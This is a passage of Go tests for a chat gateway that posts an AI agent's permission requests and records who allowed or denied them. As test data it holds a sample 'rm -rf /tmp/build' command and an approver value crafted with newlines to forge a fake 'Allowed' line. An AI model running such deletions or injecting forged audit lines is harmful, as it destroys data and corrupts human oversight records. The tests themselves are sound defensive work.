		t.Fatalf("HandlePress: %v", err)
	}
	ups := fake.updatedCalls()
	if len(ups) != 1 {
		t.Fatalf("got %d edits, want the question edited once", len(ups))
	}
	if ups[0].ref != p.Message {
		t.Errorf("edited %v, want the message the press came from (%v)", ups[0].ref, p.Message)
	}
	if !strings.Contains(ups[0].text, "presser@example.com") {
		t.Errorf("the record names nobody: %q", ups[0].text)
	}
	if !strings.Contains(ups[0].text, "Allowed") {
		t.Errorf("the record does not say what was decided: %q", ups[0].text)
	}
	// Without this the audit line reads "Allowed by X" over a blank — true, and
	// useless to anyone who was not watching when it was asked.
	if !strings.Contains(ups[0].text, "rm -rf /tmp/build") {
		t.Errorf("the record lost what was being decided: %q", ups[0].text)
	}
}

// The edit carries no Decision, which is how an adapter knows to take the
// buttons down. Leaving them up is worse than never rendering them: the
// question reads as settled and still invites a press that answers nothing.
func TestTheRecordOffersNothingLeftToPress(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "deny", "q")); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	ups := fake.updatedCalls()
	if len(ups) != 1 {
		t.Fatalf("got %d edits, want 1", len(ups))
	}
	if ups[0].reply.Decision != nil {
		t.Errorf("the settled question still carries answers: %+v", ups[0].reply.Decision)
	}
	if ups[0].reply.Kind != chat.KindDecision {
		t.Errorf("edit kind = %q, want %q so an adapter knows what it is replacing",
			ups[0].reply.Kind, chat.KindDecision)
	}
}

// A denial is the answer most worth reading correctly off a thread later. It
// must never be phrased as an allowance, whatever else changes here.
func TestADenialIsNotRecordedAsAnAllowance(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "deny", "q")); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	got := fake.updatedCalls()[0].text
	if !strings.Contains(got, "Denied") {
		t.Errorf("a denial does not say so: %q", got)
	}
	if strings.Contains(got, "Allowed") || strings.Contains(got, "✅") {
		t.Errorf("a denial reads as an approval: %q", got)
	}
}

// Every decision the gateway offers needs its own past tense. A missing one
// falls through to the raw wire value, which is what the buttons were labelled
// to avoid showing anybody.
func TestEveryAnswerHasSomethingToSayAfterwards(t *testing.T) {
	// Derived from the vocabulary, not copied out of it. A seventh decision
	// added to approval.Decisions renders through decided's fallback as its own
	// wire value — "**allow-session-path**" on an audit line — and a hand-kept
	// list here would go on passing while that shipped.
	seen := map[string]bool{}
	all := approval.Decisions()
	if len(all) == 0 {
		t.Fatal("the vocabulary is empty, so this test asserts nothing")
	}
	for _, dec := range all {
		got := decided(dec)
		if strings.Contains(got, string(dec)) {
			t.Errorf("%s renders as its own wire value (%q), so it has no phrasing of its own", dec, got)
		}
		if seen[got] {
			t.Errorf("%s reads exactly like another answer (%q), so the record cannot tell them apart", dec, got)
		}
		seen[got] = true
	}
}

// Two people press at the same moment. The one that lands writes the record;
// the other comes back "no longer pending", which is true and much less useful
// — and must not replace a named approver with it.
func TestTheLoserOfARaceDoesNotOverwriteTheWinnersRecord(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")
	p := askedPress(e, "pr1", "allow-once", "q")

	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("first press: %v", err)
	}
	d.mu.Lock()
	d.respondStatus = http.StatusNotFound
	d.mu.Unlock()
	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("second press: %v", err)
	}

	ups := fake.updatedCalls()
	if len(ups) != 1 {
		t.Fatalf("the question was rewritten %d times, want once", len(ups))
	}
	if !strings.Contains(ups[0].text, "presser@example.com") {
		t.Errorf("the record lost the approver it had: %q", ups[0].text)
	}
}

// Two presses that both get an answer out of the daemon — a double-click, or
// two people reaching the same conclusion at once. The second is as firm as the
// first, and a record may only be replaced by something firmer, so the thread is
// rewritten once rather than twice with the same words.
func TestTheSameAnswerPressedTwiceIsRecordedOnce(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")
	p := askedPress(e, "pr1", "allow-once", "q")

	for i := range 2 {
		if err := r.HandlePress(context.Background(), p); err != nil {
			t.Fatalf("press %d: %v", i+1, err)
		}
	}
	if ups := fake.updatedCalls(); len(ups) != 1 {
		t.Fatalf("the question was rewritten %d times, want once", len(ups))
	}
}

// The other way a question stops being pending: it timed out, or it was
// answered at the agent's own console. Nobody here knows what was decided, so
// the record says that rather than guessing at it.
func TestAQuestionSettledElsewhereSaysSoWithoutGuessing(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondStatus = http.StatusNotFound
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "allow-always", "q")); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	ups := fake.updatedCalls()
	if len(ups) != 1 {
		t.Fatalf("got %d edits, want the question marked settled", len(ups))
	}
	if !strings.Contains(ups[0].text, noticeSettled) {
		t.Errorf("edit = %q, want the settled notice", ups[0].text)
	}
	if strings.Contains(ups[0].text, "Allowed") {
		t.Errorf("the record claims a decision nobody here observed: %q", ups[0].text)
	}
}

// An approval the backend could attribute to nobody is a hole in the trail. It
// is already logged; the thread has to show it too, because the thread is where
// the person who pressed is looking and "Allowed by <nobody>" reads as fine.
func TestAnApprovalWithNoApproverSaysSoOnTheQuestion(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondBody = `{"acknowledged":true}`
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "allow-once", "q")); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	got := fake.updatedCalls()[0].text
	if !strings.Contains(got, "approver not recorded") {
		t.Errorf("edit = %q, want it to say nobody was named", got)
	}
}

// The record is written from what the daemon says it recorded, not from what
// the press claimed. They agree in every ordinary case; where they do not, the
// backend's audit line is the true one and the thread must not show the other.
func TestTheRecordNamesWhoTheBackendRecorded(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondBody = `{"acknowledged":true,"approver":"ana@example.com"}`
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")
	p := askedPress(e, "pr1", "allow-once", "q")
	p.Caller = "someone-else@example.com"

	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	got := fake.updatedCalls()[0].text
	if !strings.Contains(got, "ana@example.com") {
		t.Errorf("edit = %q, want the approver the backend recorded", got)
	}
	if strings.Contains(got, "someone-else@example.com") {
		t.Errorf("edit names the caller the press asserted rather than the recorded approver: %q", got)
	}
}

// Not every platform says which message a press came from. That costs the
// record and must cost nothing else — above all not the answer itself.
func TestAPressWithNoMessageToEditStillAnswers(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")
	p := askedPress(e, "pr1", "allow-once", "q")
	p.Message = chat.MessageRef{}

	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	if posts := d.posts(); len(posts) != 1 {
		t.Fatalf("got %d answers, want the press answered anyway", len(posts))
	}
	if ups := fake.updatedCalls(); len(ups) != 0 {
		t.Errorf("edited %v with no message to edit", ups)
	}
	// Nowhere to write the record does not mean nothing to say. A press is the
	// one inbound action with no reply of its own.
	if got := drainNotice(t, fake); !strings.Contains(got, "presser@example.com") {
		t.Errorf("thread got %q, want the outcome said beside the question", got)
	}
}

// A question this process never posted — a session adopted across a restart, or
// one the bounded record dropped — has no body to write the record under.
// Editing anyway would replace the question with a bare verdict and take the
// buttons down with it, so the outcome goes beside the question instead. What it
// must not do is nothing: the buttons here are still live, and a press that
// answers and says nothing is indistinguishable from a button that is broken.
func TestAQuestionThisGatewayNeverAskedIsAnsweredBesideIt(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	press := chat.Press{
		Conversation: "C1:1", Caller: "presser@example.com",
		DecisionID: ref("pr1"), Option: "allow-once",
		Message: chat.MessageRef{Conversation: "C1:1", ID: "ts1"},
	}
	if err := r.HandlePress(context.Background(), press); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	if posts := d.posts(); len(posts) != 1 {
		t.Fatalf("got %d answers, want the press answered", len(posts))
	}
	if ups := fake.updatedCalls(); len(ups) != 0 {
		t.Errorf("rewrote a question it has no record of: %v", ups)
	}
	if got := drainNotice(t, fake); !strings.Contains(got, "presser@example.com") {
		t.Errorf("thread got %q, want the outcome said beside the question", got)
	}
	// And again on the next press, because the buttons never came down. Saying
	// it once and going quiet is the failure this is guarding.
	d.mu.Lock()
	d.respondStatus = http.StatusNotFound
	d.mu.Unlock()
	if err := r.HandlePress(context.Background(), press); err != nil {
		t.Fatalf("second press: %v", err)
	}
	if got := drainNotice(t, fake); !strings.Contains(got, noticeSettled) {
		t.Errorf("second press got %q, want the settled notice", got)
	}
}

// drainNotice returns the one reply the thread was sent, failing if there was
// none or more than one.
func drainNotice(t *testing.T, fake *fakeSender) string {
	t.Helper()
	var got string
	select {
	case r := <-fake.replies:
		got = r.Text
	default:
		t.Fatal("the thread was told nothing")
	}
	select {
	case extra := <-fake.replies:
		t.Fatalf("a second reply nobody asked for: %q", extra.Text)
	default:
	}
	return got
}

// An edit that fails changes nothing about the decision, which has already been
// applied. Reporting it as a failed press invites a second press that answers
// nothing and gets told the question is gone.
func TestAFailedEditIsNotAFailedPress(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, logs := permsRouter(t, d)
	fake.failUpdates(true)
	e := liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "allow-once", "q")); err != nil {
		t.Fatalf("HandlePress reported a failure the presser cannot act on: %v", err)
	}
	if !hasLine(logs(), "record decision") {
		t.Errorf("the failed edit left no trace at all: %v", logs())
	}
}

// An edit that fails must not cost the thread the record. It cannot be retried
// on the next press: the prompt is spent, so the daemon answers that press "no
// longer pending" — which would write "expired" over an approval that was
// applied and attributed. So the outcome goes beside the question instead, and
// the claim it took is kept.
func TestAnEditThatFailedPutsTheRecordBesideTheQuestion(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondOnce = true
	r, fake, _ := permsRouter(t, d)
	fake.failUpdates(true)
	e := liveEntry(r, "C1:1")
	p := askedPress(e, "pr1", "allow-once", "a question")

	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("first press: %v", err)
	}
	got := drainNotice(t, fake)
	if !strings.Contains(got, "presser@example.com") || !strings.Contains(got, "Allowed") {
		t.Errorf("the thread was told %q, want the record the edit could not carry", got)
	}

	// The buttons are still up, so the question is still pressable — and what
	// that press finds is a prompt nobody can answer any more.
	fake.failUpdates(false)
	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("second press: %v", err)
	}
	for _, up := range fake.updatedCalls() {
		if strings.Contains(up.text, noticeSettled) {
			t.Errorf("an applied approval was overwritten with %q", up.text)
		}
	}
}

// The vaguer record loses to the real one whichever press writes first. A press
// that finds nothing pending knows the question is over and nothing else; if
// that arrives before the answer that actually settled it — two independent
// round trips, so it can — the thread must still end up naming the approver.
func TestTheRecordThatNamesAnApproverOutranksTheOneThatDoesNot(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondStatus = http.StatusNotFound
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")
	p := askedPress(e, "pr1", "allow-always", "a question")

	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("the press that found nothing pending: %v", err)
	}
	d.mu.Lock()
	d.respondStatus = 0
	d.mu.Unlock()
	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("the press that was answered: %v", err)
	}

	ups := fake.updatedCalls()
	if len(ups) != 2 {
		t.Fatalf("got %d edits, want the vague record replaced by the real one", len(ups))
	}
	if !strings.Contains(ups[0].text, noticeSettled) {
		t.Errorf("first edit = %q, want the settled notice", ups[0].text)
	}
	last := ups[len(ups)-1]
	if !strings.Contains(last.text, "presser@example.com") {
		t.Errorf("the thread was left saying %q, want the approver named", last.text)
	}
	if strings.Contains(last.text, noticeSettled) {
		t.Errorf("the thread was left with the vaguer account: %q", last.text)
	}
	// And the question, which the first record had to keep for the second.
	if !strings.Contains(last.text, "a question") {
		t.Errorf("the replacement lost what was being decided: %q", last.text)
	}
}

// The same thing under an actual race, which is the only way the ordering above
// arises in production: Slack hands each press to its own goroutine. Run with
// -race, this is also the only concurrent exercise the press path gets.
func TestSimultaneousPressesLeaveTheThreadNamingTheApprover(t *testing.T) {
	for attempt := 0; attempt < 50; attempt++ {
		d := newPermsDaemon(t)
		d.respondOnce = true // the first answer lands; every one after it 404s
		r, fake, _ := permsRouter(t, d)
		e := liveEntry(r, "C1:1")
		p := askedPress(e, "pr1", "allow-once", "a question")

		var wg sync.WaitGroup
		for i := 0; i < 4; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				if err := r.HandlePress(context.Background(), p); err != nil {
					t.Errorf("press: %v", err)
				}
			}()
		}
		wg.Wait()

		ups := fake.updatedCalls()
		if len(ups) == 0 {
			t.Fatalf("attempt %d: four presses and the question was never recorded", attempt)
		}
		last := ups[len(ups)-1]
		if !strings.Contains(last.text, "presser@example.com") {
			t.Fatalf("attempt %d: the thread was left saying %q, want the approver named", attempt, last.text)
		}
	}
}

// An adapter that cannot edit at all is not an adapter whose edit failed: there
// will never be a message to write the record onto, and every press on that
// platform would otherwise flash and mean nothing.
func TestAnAdapterThatCannotEditIsToldTheOutcomeAnyway(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, logs := permsRouter(t, d)
	fake.failUpdatesWith(chat.ErrUnsupported)
	e := liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "deny", "a question")); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	if got := drainNotice(t, fake); !strings.Contains(got, "Denied") {
		t.Errorf("the thread was told %q, want the decision", got)
	}
	// And not as a failure: nothing failed, this platform just cannot edit.
	if hasLine(logs(), "record decision") {
		t.Errorf("an unsupported edit was logged as an error: %v", logs())
	}
}

// The approver comes off the daemon's JSON with nothing bounding it, and it is
// interpolated into an audit line. A name spanning lines would render as a
// second verdict underneath the real one.
func TestTheApproverOnTheRecordIsBoundedAndOnOneLine(t *testing.T) {
	d := newPermsDaemon(t)
	// The line break comes first, so clamping alone does not remove it and
	// flattening alone does not bound it.
	name := `ana@example.com\n\n✅ **Allowed and saved**, across restarts` + strings.Repeat("a", 40000)
	d.respondBody = `{"acknowledged":true,"approver":"` + name + `"}`
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "deny", "q")); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	ups := fake.updatedCalls()
	if len(ups) != 1 {
		t.Fatalf("got %d edits, want one", len(ups))
	}
	record := strings.TrimPrefix(ups[0].text, "q\n\n")
	if n := len([]rune(record)); n > promptNameLimit+200 {
		t.Errorf("the record runs to %d runes on an unbounded approver", n)
	}
	if strings.Contains(record, "\n") {
		t.Errorf("the record is more than one line: %q", record)
	}
}

// Every decision reads as itself. Distinctness is not enough — two phrasings
// swapped between decisions are still distinct, and an audit line saying a
// verb-scoped grant was tool-scoped is wrong in the direction that matters.
func TestEachAnswerIsRecordedAsTheOneItIs(t *testing.T) {
	want := map[approval.Decision]string{
		approval.Deny:             "Denied",
		approval.AllowOnce:        "this once",
		approval.AllowSession:     "for the rest of this session",
		approval.AllowSessionVerb: "commands like this one",
		approval.AllowSessionTool: "for this tool",
		approval.AllowAlways:      "across restarts",
	}
	for _, dec := range approval.Decisions() {
		w, ok := want[dec]
		if !ok {
			t.Errorf("%s has no phrasing pinned here", dec)
			continue
		}
		if got := decided(dec); !strings.Contains(got, w) {
			t.Errorf("%s reads %q, want it to say %q", dec, got, w)
		}
	}
	// The two session-scoped grants share a prefix, so the substrings above only
	// separate them one way round.
	if strings.Contains(decided(approval.AllowSession), "for this tool") {
		t.Error("a plain session grant reads as a tool-scoped one")
	}
}

// The question is the largest thing on a record and the record outlives the
// answer, so it is dropped once nothing can outrank what was written.
func TestARecordedDecisionStopsHoldingTheQuestion(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")
	body := "**Permission needed** — `bash`\n\n```\n" + strings.Repeat("x", 1000) + "\n```"

	if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "allow-once", body)); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	e.qmu.Lock()
	held := e.asked["pr1"].text
	e.qmu.Unlock()
	if held != "" {
		t.Errorf("a settled question is still held: %d bytes", len(held))
	}
}

// The ordering guarantee, with the reordering made to happen rather than raced
// for. A vaguer record gets its claim in first and its edit is slow; the record
// that names an approver arrives while that edit is still in the air. Unless
// claiming and writing are one step, both edits are in flight at once and the
// thread is left showing whichever the platform happened to finish last — which
// is the vague one, over an approval that was applied and attributed.
func TestASlowRecordCannotLandOnTopOfAFirmerOne(t *testing.T) {
	r, fake, _ := permsRouter(t, newPermsDaemon(t))
	e := liveEntry(r, "C1:1")
	e.claimAsk("pr1", "a question")
	p := chat.Press{
		Conversation: "C1:1",
		Message:      chat.MessageRef{Conversation: "C1:1", ID: "ts1"},
	}
	fake.stallEditsSaying(noticeSettled, 200*time.Millisecond)

	claimed := make(chan struct{})
	done := make(chan struct{})
	go func() {
		defer close(done)
		close(claimed)
		r.traceDecision(context.Background(), e, p, "pr1", noticeSettled, settledElsewhere)
	}()
	<-claimed
	// Long enough for the goroutine to have claimed and be inside its edit, and
	// well short of the stall it is sitting in.
	time.Sleep(20 * time.Millisecond)

	const record = "✅ **Allowed**, this once — ana@example.com"
	r.traceDecision(context.Background(), e, p, "pr1", record, settledHere)
	<-done

	ups := fake.updatedCalls()
	if len(ups) == 0 {
		t.Fatal("nothing was written onto the question")
	}
	if last := ups[len(ups)-1].text; !strings.Contains(last, record) {
		t.Errorf("the thread was left saying %q, wanted the record that names an approver", last)
	}
}

// A 2xx the daemon then spoiled is not "that didn't reach the agent". Telling
// somebody to press again there is wrong twice over: the decision is probably
// in force, and the retry finds nothing pending, so the thread would settle on
// "expired" over an answer that took effect.
func TestAnAnswerThatMayHaveLandedIsNotReportedAsOneThatDidNot(t *testing.T) {
	for _, tc := range []struct{ name, body string }{
		{"unreadable", `{"acknowledged":`},
		{"unacknowledged", `{"acknowledged":false}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			d := newPermsDaemon(t)
			d.respondBody = tc.body
			r, fake, _ := permsRouter(t, d)
			e := liveEntry(r, "C1:1")

			if err := r.HandlePress(context.Background(), askedPress(e, "pr1", "allow-once", "q")); err == nil {
				t.Fatal("a decision with no confirmation was reported as confirmed")
			}
			if got := drainNotice(t, fake); got != noticeMaybeApplied {
				t.Errorf("the thread was told %q, want %q", got, noticeMaybeApplied)
			}
			if len(fake.updatedCalls()) != 0 {
				t.Error("a decision nobody confirmed was written onto the question as one")
			}
		})
	}
}
